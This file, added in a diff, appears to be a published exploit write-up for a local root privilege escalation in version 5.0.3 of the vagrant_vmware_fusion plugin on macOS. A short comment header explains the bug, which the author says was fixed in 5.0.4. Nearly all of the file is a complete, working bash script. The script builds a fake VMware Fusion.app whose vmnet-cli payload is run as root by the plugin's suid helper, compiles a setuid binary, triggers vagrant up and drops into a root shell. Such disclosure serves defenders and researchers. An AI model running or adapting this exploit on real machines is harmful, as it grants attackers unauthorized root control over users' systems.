@@ -1,0 +1,161 @@
+# Another day, another root privesc bug in this plugin. Not quite so serious this
+# time - this one is only exploitable if the user has the plugin installed but
+# VMware Fusion *not* installed. This is a fairly unlikely scenario but it's a
+# straight to root privesc with no user interaction so isn't the kind of thing
+# that should be shipping with any software.
+
+# This occurs because the suid root sudo helper that I have discussed in previous
+# exploit writeups executes /Applications/VMware
+# Fusion.app/Contents/Library/vmnet-cli
+# as root, but if the application isn't installed and we're a local admin user we
+# can create a fake app directory with a payload in place of vmnet-cli that gets
+# executed as root.
+
+# HashiCorp fixed this (very quickly) in 5.0.4.
+
+# https://m4.rkw.io/vagrant_vmware_privesc_5.0.3.sh.txt
+# 3c11083386b3f7352d60b327190eed4364383c0622351db5410d809f4bda746a
+# ------------------------------------------------------------------------------
+#!/bin/bash
+echo
+echo "#########################################################"
+echo "# vagrant_vmware_fusion plugin 5.0.3 local root privesc #"
+echo "# by m4rkw - https://m4.rkw.io/blog.html                #";
+echo "#########################################################"
+echo "# Note: only works when VMWare Fusion is not installed. #"
+echo "#########################################################"
+echo
+
+cleanup() {
+  exec 2> /dev/null
+  killall -9 vagrant 1>/dev/null 2>/dev/null
+  kill -9 `ps auxwww |egrep '\/vagrant up$' |xargs -L1 |cut -d ' ' -f2` &>/dev/null
+  exec 2> /dev/tty
+  cd
+  rm -rf .vagrant_vmware_fusion_503_exp
+  rm -rf /Applications/VMware\ Fusion.app
+}
+
+if [ -e "/Applications/VMware Fusion.app" ] ; then
+  echo "Fusion is installed, not exploitable."
+  exit 1
+fi
+
+echo "setting up fake app directory..."
+
+mkdir /Applications/VMware\ Fusion.app
+if [ ! $? -eq 0 ] ; then
+  echo "Failed to create /Applications/VMware Fusion.app."
+  exit 1
+fi
+
+mkdir -p /Applications/VMware\ Fusion.app/Contents/Library/services
+
+touch /Applications/VMware\ Fusion.app/Contents/Library/vmrun
+touch /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmrun
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/services/Open\ VMware\ Fusion\ Services
+
+cat > /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx <<EOF
+#!/bin/bash
+echo 1>&2
+echo "VMware Fusion Information:" 1>&2
+echo "VMware Fusion 10.0.1 build-6754183 Release" 1>&2
+echo
+EOF
+
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmware-vmx
+
+cat > /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli <<EOF
+#!/bin/bash
+chown root:wheel /tmp/vvp_503
+chmod 4755 /tmp/vvp_503
+EOF
+
+chmod 755 /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli
+
+echo "compiling payload..."
+
+cat > /tmp/vvp_503.c <<EOF
+#include <unistd.h>
+int main()
+{
+  setuid(0);
+  seteuid(0);
+  execl("/bin/bash","bash","-c","rm -f /tmp/vvp_503; /bin/bash",NULL);
+  return 0;
+}
+EOF
+gcc -o /tmp/vvp_503 /tmp/vvp_503.c
+rm -f /tmp/vvp_503.c
+
+cd
+mkdir .vagrant_vmware_fusion_503_exp
+cd .vagrant_vmware_fusion_503_exp
+
+echo "writing dummy vagrantfile ..."
+
+cat > vagrantfile <<EOF
+Vagrant.configure('2') do |config|
+  config.vm.box = 'envimation/ubuntu-xenial'
+end
+EOF
+
+echo "triggering vagrant up [stage 1]..."
+
+vagrant up &>/dev/null &
+
+while :
+do
+  r=`ps auxwww |grep 'vagrant up' |grep -v grep`
+  if [ "$r" == "" ] ; then
+    break
+  fi
+  sleep 0.5
+done
+
+echo "dropping dummy machine..."
+
+uuid=`ls -1 .vagrant/machines/default/vmware_fusion |grep -v vagrant_cwd`
+touch .vagrant/machines/default/vmware_fusion/$uuid/ubuntu-xenial-vmware-fusion.vmx
+echo -n "`pwd`/.vagrant/machines/default/vmware_fusion/$uuid/ubuntu-xenial-vmware-fusion.vmx" > .vagrant/machines/default/vmware_fusion/id
+
+echo "triggering vagrant up [stage 2]..."
+
+vagrant up &>/dev/null &
+
+echo "waiting for payload to trigger ..."
+
+count=0
+success=0
+
+while :
+do
+  r=`ls -la /tmp/vvp_503 |grep -- '-rwsr-xr-x  1 root  wheel'`
+  if [ "$r" != "" ] ; then
+    success=1
+    break
+  fi
+  r=`ps auxwww |grep 'vagrant up' |grep -v grep`
+  if [ "$r" == "" ] ; then
+    break
+  fi
+  sleep 0.2
+  count=$(($count + 1))
+  if [ $count -eq 250 ] ; then
+    echo "Timed out waiting for the payload to trigger."
+    cleanup
+    exit 1
+  fi
+done
+
+cleanup
+
+if [ ! $success -eq 1 ] ; then
+  echo "exploit failed."
+  exit 1
+fi
+
+echo
+cd
+/tmp/vvp_503
